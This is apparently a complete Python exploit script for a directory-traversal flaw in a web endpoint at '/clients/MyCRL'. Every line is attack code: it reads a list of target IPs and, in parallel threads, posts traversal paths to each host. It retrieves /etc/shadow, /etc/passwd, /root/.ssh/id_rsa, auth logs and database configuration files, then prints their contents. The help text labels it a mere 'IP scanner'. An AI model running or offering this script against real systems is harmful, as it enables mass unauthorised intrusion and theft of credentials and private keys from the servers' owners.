import requests  
import argparse  
import concurrent.futures  
from urllib3.exceptions import InsecureRequestWarning  
from colorama import Fore, Style, init  
from requests.exceptions import RequestException, Timeout  
  
init(autoreset=True)  
  
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)  
  
def exploit(ip, path):  
    target = f'https://{ip}/clients/MyCRL'  
    data = path  
  
    headers = {  
        'Host': f'{ip}',  
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0',  
        'Te': 'trailers',  
        'Dnt': '1',  
        'Connection': 'keep-alive',  
        'Content-Length': str(len(data))  
    }  
  
    try:  
        response = requests.post(target, headers=headers, data=data, verify=False, timeout=10)  
  
        if response.status_code == 200:  
            print(f"{Fore.GREEN}Contents of {path}:")  
            print(f"{Fore.BLUE}{response.text}")  
        else:  
            print(f"{Fore.RED}Failed to access {path}")  
    except Timeout:  
        print(f"{Fore.RED}Connection timed out for {path}")  
    except RequestException as e:  
        print(f"{Fore.RED}Request failed for {path}: {e}")  
  
def scan_ip(ip):  
    paths = [  
        'aCSHELL/../../../../../../../../../../../etc/passwd',  
        'aCSHELL/../../../../../../../../../../../etc/apache2/apache2.conf',  
        'aCSHELL/../../../../../../../../../../../etc/mysql/my.cnf',  
        'aCSHELL/../../../../../../../../../../../var/log/syslog',  
        'aCSHELL/../../../../../../../../../../../var/log/auth.log',  
        #'aCSHELL/../../../../../../../../../../../var/log/messages',  
        'aCSHELL/../../../../../../../../../../../etc/group',  
        'aCSHELL/../../../../../../../../../../../etc/shadow',  
        'aCSHELL/../../../../../../../../../../../root/.ssh/id_rsa',  
        'aCSHELL/../../../../../../../../../../../etc/hostname',  
        'aCSHELL/../../../../../../../../../../../etc/hosts',  
        'aCSHELL/../../../../../../../../../../../etc/resolv.conf'  
    ]  
    for path in paths:  
        exploit(ip, path)  
  
def main():  
    parser = argparse.ArgumentParser(description="IP scanner with multithreading")  
    parser.add_argument('-i', '--input', help='File with IPs', required=True)  
    parser.add_argument('-t', '--threads', help='Number of threads', required=False, default=5, type=int)  
    args = parser.parse_args()  
  
    with open(args.input, 'r') as file:  
        ips = file.read().splitlines()  
  
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:  
        executor.map(scan_ip, ips)  
  
if __name__ == '__main__':  
    main()  
